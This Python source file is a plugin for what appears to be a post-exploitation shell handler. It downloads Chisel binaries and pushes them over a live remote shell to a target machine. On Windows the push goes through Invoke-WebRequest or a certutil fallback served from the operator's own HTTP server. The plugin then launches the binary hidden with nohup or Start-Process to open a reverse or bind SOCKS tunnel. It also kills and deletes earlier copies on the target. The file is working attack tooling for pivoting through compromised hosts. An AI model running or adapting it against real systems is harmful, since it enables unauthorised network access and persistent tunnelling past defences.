"""
Chisel tunneling plugin.
Manages agent binaries, transfers them using chunked upload with integrity checks,
and executes the agent in reverse (client) or bind (server) mode as a background process.
"""

import argparse
import gzip
import os
import shutil
import time
import urllib.request
import zipfile
import socketserver
import threading
import urllib.parse
import json
from http.server import SimpleHTTPRequestHandler

from ..api import plugin, SessionContext
from ...constants import PLUGIN_MARK_END, PLUGIN_MARK_START

PLUGIN_DIR = os.path.dirname(os.path.abspath(__file__))
BIN_DIR = os.path.join(os.path.dirname(os.path.dirname(PLUGIN_DIR)), 'chisel_binaries')
VERSION_FILE = os.path.join(BIN_DIR, 'chisel_version.txt')

CHISEL_LINUX = 'chisel_linux'
CHISEL_WIN = 'chisel_windows.exe'

GITHUB_API_LATEST = "https://api.github.com/repos/jpillora/chisel/releases/latest"
FALLBACK_VERSION = "1.12.0"

_CACHED_VERSION = None

def _get_latest_version(session):
    """Query GitHub API for the latest release version."""
    global _CACHED_VERSION
    if _CACHED_VERSION:
        return _CACHED_VERSION

    try:
        req = urllib.request.Request(GITHUB_API_LATEST, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode())
            tag = data['tag_name']
            if tag.startswith('v'):
                version = tag[1:]
            else:
                version = tag
            session.print(f"Latest Chisel version: {version}", 'green')
            _CACHED_VERSION = version
            return version
    except Exception as e:
        session.print(f"Could not fetch latest version: {e}. Falling back to {FALLBACK_VERSION}", 'yellow')
        _CACHED_VERSION = FALLBACK_VERSION
        return _CACHED_VERSION


def _read_stored_version():
    """Read the version of currently cached binaries."""
    if os.path.isfile(VERSION_FILE):
        with open(VERSION_FILE, 'r') as f:
            return f.read().strip()
    return None


def _write_stored_version(version):
    """Store the version of the binaries we have."""
    with open(VERSION_FILE, 'w') as f:
        f.write(version)


def _ensure_bin_dir():
    if not os.path.exists(BIN_DIR):
        os.makedirs(BIN_DIR, exist_ok=True)


def _download_file(url, dest_path):
    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req) as resp:
            with open(dest_path, 'wb') as f:
                while True:
                    chunk = resp.read(8192)
                    if not chunk:
                        break
                    f.write(chunk)
        return True
    except Exception:
        return False


def _download_and_extract_linux(session, version):
    _ensure_bin_dir()
    filename = f'chisel_{version}_linux_amd64.gz'
    archive = os.path.join(BIN_DIR, filename)
    url = f'https://github.com/jpillora/chisel/releases/download/v{version}/{filename}'
    session.print("Downloading Linux agent...", 'yellow')
    if not _download_file(url, archive):
        session.print("Linux download failed.", 'red')
        return False

    extracted_name = f'chisel_{version}_linux_amd64'
    extracted_path = os.path.join(BIN_DIR, extracted_name)
    try:
        with gzip.open(archive, 'rb') as gz:
            with open(extracted_path, 'wb') as out:
                shutil.copyfileobj(gz, out)
    except Exception as e:
        session.print(f"Extraction error: {e}", 'red')
        os.remove(archive)
        return False

    target = os.path.join(BIN_DIR, CHISEL_LINUX)
    shutil.move(extracted_path, target)
    os.chmod(target, 0o755)
    os.remove(archive)
    session.print("Linux agent ready.", 'green')
    return True


def _download_and_extract_windows(session, version):
    _ensure_bin_dir()
    filename = f'chisel_{version}_windows_amd64.zip'
    archive = os.path.join(BIN_DIR, filename)
    url = f'https://github.com/jpillora/chisel/releases/download/v{version}/{filename}'
    session.print("Downloading Windows agent...", 'yellow')
    if not _download_file(url, archive):
        session.print("Windows download failed.", 'red')
        return False

    extract_dir = os.path.join(BIN_DIR, 'chisel_windows_extract')
    os.makedirs(extract_dir, exist_ok=True)
    try:
        with zipfile.ZipFile(archive, 'r') as zf:
            zf.extractall(extract_dir)
    except Exception as e:
        session.print(f"Extraction error: {e}", 'red')
        shutil.rmtree(extract_dir, ignore_errors=True)
        os.remove(archive)
        return False

    exe_path = None
    for root, _, files in os.walk(extract_dir):
        for f in files:
            if f.lower().endswith('.exe') and 'chisel' in f.lower():
                exe_path = os.path.join(root, f)
                break
        if exe_path:
            break
    if not exe_path:
        session.print("Could not find chisel.exe in extracted archive.", 'red')
        shutil.rmtree(extract_dir, ignore_errors=True)
        os.remove(archive)
        return False

    target = os.path.join(BIN_DIR, CHISEL_WIN)
    shutil.move(exe_path, target)
    shutil.rmtree(extract_dir, ignore_errors=True)
    os.remove(archive)
    session.print("Windows agent ready.", 'green')
    return True


def ensure_binaries(session):
    _ensure_bin_dir()
    linux_path = os.path.join(BIN_DIR, CHISEL_LINUX)
    win_path = os.path.join(BIN_DIR, CHISEL_WIN)

    if os.path.isfile(linux_path) and os.path.isfile(win_path):
        session.print("Chisel binaries are available. Continuing...", 'green')
        return True

    version = _get_latest_version(session)
    if not os.path.isfile(linux_path):
        if not _download_and_extract_linux(session, version):
            return False
    if not os.path.isfile(win_path):
        if not _download_and_extract_windows(session, version):
            return False

    _write_stored_version(version)
    session.print("Both Chisel binaries are ready.", 'green')
    return True

def _format_size(nbytes):
    for unit in ['B', 'KB', 'MB', 'GB']:
        if nbytes < 1024.0:
            return f"{nbytes:.1f} {unit}"
        nbytes /= 1024.0
    return f"{nbytes:.1f} TB"

def _remote_sha256_safe(session, remote_path, shell_type):
    handler = session._handler
    sock = session._client_sock
    try:
        return handler._remote_sha256(sock, remote_path, shell_type)
    except Exception:
        return None


def _kill_and_remove_remote(session, remote_path, shell_type):
    handler = session._handler
    sock = session._client_sock

    if shell_type in ('linux', 'unix'):
        session.print("Cleaning up previous chisel instance...", 'yellow')
        handler._flush_shell(sock, timeout=1.0)
        cmd = (
            "pkill -9 -x chisel 2>/dev/null; "
            "sleep 0.3; "
            f"rm -f {remote_path} 2>/dev/null; "
            "echo CLEANED\n"
        )
        sock.sendall(cmd.encode())
        time.sleep(0.6)
        handler.recv_output(sock, timeout=2.0)
    else:
        safe_path = remote_path.replace("'", "''")
        ps = (
            "Stop-Process -Name chisel -Force -ErrorAction SilentlyContinue; "
            "Start-Sleep -Milliseconds 400; "
            f"Remove-Item -Force -ErrorAction SilentlyContinue '{safe_path}'; "
            "echo CLEANED"
        )
        handler._flush_shell(sock, timeout=1.0)
        sock.sendall(f'powershell -Command "{ps}"\n'.encode())
        time.sleep(1.0)
        handler.recv_output(sock, timeout=2.0)

def _upload_file(session, local_path, remote_path, resume=False):
    handler = session._handler
    sock = session._client_sock
    colors = handler.colors

    info = handler._client_info(sock)
    if not info:
        session.print("Cannot determine target OS.", 'red')
        return False
    shell_type = info.get('type', 'unknown')

    if not os.path.isfile(local_path):
        session.print(f"Local file not found: {local_path}", 'red')
        return False

    total = os.path.getsize(local_path)
    local_hash = handler._sha256_file(local_path)

    if shell_type == 'windows':
        if resume:
            session.print("Resume not supported for Windows uploads – performing full upload.", 'yellow')

        try:
            with open(local_path, 'rb') as f:
                content = f.read()
        except Exception as e:
            session.print(f"Failed to read local file: {e}", 'red')
            return False

        class AgentHandler(SimpleHTTPRequestHandler):
            def do_GET(self):
                parsed = urllib.parse.urlparse(self.path)
                if parsed.path == '/file':
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/octet-stream')
                    self.send_header('Content-Length', str(len(content)))
                    self.end_headers()
                    self.wfile.write(content)
                else:
                    self.send_response(404)
                    self.end_headers()
            def log_message(self, fmt, *args):
                pass

        class ReusableTCPServer(socketserver.TCPServer):
            allow_reuse_address = True

        server = None
        try:
            server = ReusableTCPServer(('0.0.0.0', 0), AgentHandler)
            port = server.server_address[1]
        except Exception as e:
            session.print(f"Failed to start HTTP server: {e}", 'red')
            return False

        stop_event = threading.Event()
        def serve():
            while not stop_event.is_set():
                server.handle_request()
            server.server_close()

        thread = threading.Thread(target=serve, daemon=True)
        thread.start()

        handler_ip = sock.getsockname()[0]
        url = f"http://{handler_ip}:{port}/file"
        escaped = remote_path.replace("'", "''")
        ps_cmd = (
            f"$ErrorActionPreference='Stop'; "
            f"try {{ Invoke-WebRequest -Uri '{url}' -OutFile '{escaped}' -UseBasicParsing -ErrorAction Stop; "
            f"Write-Output '{PLUGIN_MARK_START}OK{PLUGIN_MARK_END}' }} "
            f"catch {{ certutil -urlcache -f '{url}' '{escaped}' 2>$null; "
            f"if ($?) {{ Write-Output '{PLUGIN_MARK_START}OK{PLUGIN_MARK_END}' }} "
            f"else {{ Write-Output '{PLUGIN_MARK_START}FAIL{PLUGIN_MARK_END}' }} }}"
        )

        session.print(f"Uploading via HTTP: {_format_size(total)}", 'yellow')
        handler._flush_shell(sock, timeout=1.0)
        sock.sendall((ps_cmd + '\n').encode())

        start = time.time()
        output = b''
        marker_start = PLUGIN_MARK_START.encode()
        marker_end = PLUGIN_MARK_END.encode()
        while time.time() - start < 60.0:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                output += chunk
                if marker_start in output and marker_end in output:
                    break
            except Exception:
                break

        stop_event.set()
        thread.join(timeout=2.0)

        result = None
        try:
            si = output.find(marker_start) + len(marker_start)
            ei = output.find(marker_end, si)
            if si != -1 and ei != -1:
                result = output[si:ei].decode().strip()
        except Exception:
            pass

        if result != 'OK':
            session.print("Windows upload failed.", 'red')
            return False

        print(f"{colors['yellow']}Verifying integrity...{colors['end']}", end='', flush=True)
        remote_hash = handler._remote_sha256(sock, remote_path, shell_type)
        if remote_hash == local_hash:
            print(f"\r{colors['green']}Integrity verified.{colors['end']}")
            return True
        else:
            print(f"\r{colors['red']}Integrity mismatch!{colors['end']}")
            return False

    chunk_size = handler._write_chunk_size(remote_path, shell_type)
    session.print(f"Uploading {_format_size(total)} in chunks of {_format_size(chunk_size)}", 'yellow')
    handler._flush_shell(sock, timeout=1.0)

    if not handler._remote_truncate(sock, remote_path, shell_type):
        session.print("Failed to prepare remote file.", 'red')
        return False
    handler.recv_output(sock, timeout=2.0)

    transferred = 0
    first = True
    start_time = time.time()

    try:
        with open(local_path, 'rb') as f:
            while transferred < total:
                data = f.read(chunk_size)
                if not data:
                    break
                if not handler._remote_write_chunk(
                    sock, remote_path, data, shell_type,
                    truncate=first, skip_flush=not first
                ):
                    session.print(f"Upload failed at {_format_size(transferred)}", 'red')
                    return False
                first = False
                transferred += len(data)
                elapsed = time.time() - start_time
                speed = transferred / elapsed if elapsed > 0 else 0
                pct = int(100 * transferred / total)
                bar = '#' * (pct // 2) + '-' * (50 - pct // 2)
                print(f"\r[{bar}] {pct}% {_format_size(transferred)}/{_format_size(total)} @ {_format_size(speed)}/s", end='')
    except Exception as e:
        session.print(f"\nUpload error: {e}", 'red')
        return False

    print()
    handler._flush_shell(sock, timeout=1.0)

    print(f"{colors['yellow']}Verifying integrity...{colors['end']}", end='', flush=True)
    remote_hash = handler._remote_sha256(sock, remote_path, shell_type)
    if remote_hash == local_hash:
        print(f"\r{colors['green']}Integrity verified.{colors['end']}")
        return True
    else:
        print(f"\r{colors['red']}Integrity mismatch!{colors['end']}")
        return False

@plugin.command(
    name='chisel',
    platforms=['linux', 'windows', 'unix'],
    description='Deploy Chisel agent to target in reverse (client) or bind (server) mode.',
)
def run(session: SessionContext, args):
    parser = argparse.ArgumentParser(prog='chisel', description='Chisel agent deployment')
    parser.add_argument('mode', choices=['reverse', 'bind'], help='Mode: reverse (client) or bind (server)')
    parser.add_argument('-i', '--ip', help='IP address for reverse connection (required for reverse mode)')
    parser.add_argument('-p', '--port', required=True, type=int, help='Port to connect to (reverse) or listen on (bind)')

    try:
        parsed = parser.parse_args(args)
    except SystemExit:
        return 1

    if not (1 <= parsed.port <= 65535):
        session.print("Port must be between 1 and 65535.", 'red')
        return 1

    if parsed.mode == 'reverse' and not parsed.ip:
        session.print("Reverse mode requires -i/--ip.", 'red')
        return 1

    session.log_event('Chisel plugin started')
    session.print(f"Chisel mode: {parsed.mode}, port {parsed.port}", 'yellow')

    if not ensure_binaries(session):
        session.print("Binary preparation failed.", 'red')
        return 1

    handler = session._handler
    sock = session._client_sock
    info = handler._client_info(sock)
    if not info:
        session.print("Could not get target OS info.", 'red')
        return 1

    shell_type = info.get('type', 'unknown')
    if shell_type == 'windows':
        local_bin = os.path.join(BIN_DIR, CHISEL_WIN)
        remote_path = 'C:\\Windows\\Temp\\chisel.exe'
    elif shell_type in ('linux', 'unix'):
        local_bin = os.path.join(BIN_DIR, CHISEL_LINUX)
        remote_path = '/tmp/chisel'
    else:
        session.print(f"Unsupported target OS: {shell_type}", 'red')
        return 1

    if not os.path.isfile(local_bin):
        session.print(f"Local binary missing: {local_bin}", 'red')
        return 1

    session.print(f"Uploading {os.path.basename(local_bin)} to {remote_path}...", 'yellow')

    local_hash = handler._sha256_file(local_bin)
    remote_hash = _remote_sha256_safe(session, remote_path, shell_type)

    if remote_hash == local_hash:
        session.print("Remote binary already matches local build, skipping upload.", 'green')
    else:
        _kill_and_remove_remote(session, remote_path, shell_type)
        if not _upload_file(session, local_bin, remote_path, resume=False):
            session.print("Transfer failed.", 'red')
            return 1

    if shell_type in ('linux', 'unix'):
        session.print("Setting executable permission...", 'yellow')
        handler._flush_shell(sock, timeout=1.0)
        sock.sendall(f"chmod +x {remote_path}\n".encode())
        time.sleep(0.5)
        handler.recv_output(sock, timeout=2.0)

    if parsed.mode == 'reverse':
        cmd_args = f"client -v {parsed.ip}:{parsed.port} R:socks"
    else:
        cmd_args = f"server -v -p {parsed.port} --socks5"

    full_cmd = f"{remote_path} {cmd_args}".strip()

    session.print(f"Starting Chisel in background: {full_cmd}", 'yellow')
    handler._flush_shell(sock, timeout=1.0)

    if shell_type in ('linux', 'unix'):
        cmd = f"nohup {full_cmd} > /dev/null 2>&1 & echo $!\n"
        sock.sendall(cmd.encode())
        time.sleep(2.0)
        session.print("Chisel started (no confirmation).", 'green')
    else:
        safe_path = remote_path.replace("'", "''")
        safe_args = cmd_args.replace("'", "''")
        ps_cmd = (
            f"Start-Process -FilePath '{safe_path}' -ArgumentList '{safe_args}' -WindowStyle Hidden; "
            f"echo {PLUGIN_MARK_START}OK{PLUGIN_MARK_END}"
        )
        full_ps = f'powershell -Command "{ps_cmd}"\n'
        sock.sendall(full_ps.encode())

        output = b''
        m_start = PLUGIN_MARK_START.encode()
        m_end = PLUGIN_MARK_END.encode()
        start = time.time()
        while time.time() - start < 15.0:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                output += chunk
                if m_start in output and m_end in output:
                    break
            except Exception:
                break

        if m_start in output and m_end in output:
            session.print("PowerShell command executed successfully.", 'green')
            sock.sendall(b'tasklist | findstr chisel.exe\n')
            time.sleep(1)
            task_output = handler.recv_output(sock, timeout=2.0)
            if task_output and 'chisel.exe' in task_output:
                session.print("Agent is running (found in tasklist).", 'green')
            else:
                session.print("Agent NOT found in tasklist – it may have crashed or exited immediately.", 'red')
                session.print(f"tasklist output: {task_output}", 'yellow')
            session.log_plugin_result('chisel', 'success', 'agent confirmed')
        else:
            session.print("PowerShell command execution not confirmed (marker not received).", 'red')
            session.log_plugin_result('chisel', 'error', 'no confirmation')

    session.print("Chisel deployment completed.", 'green')
    session.log_event('Chisel plugin finished')
    return 0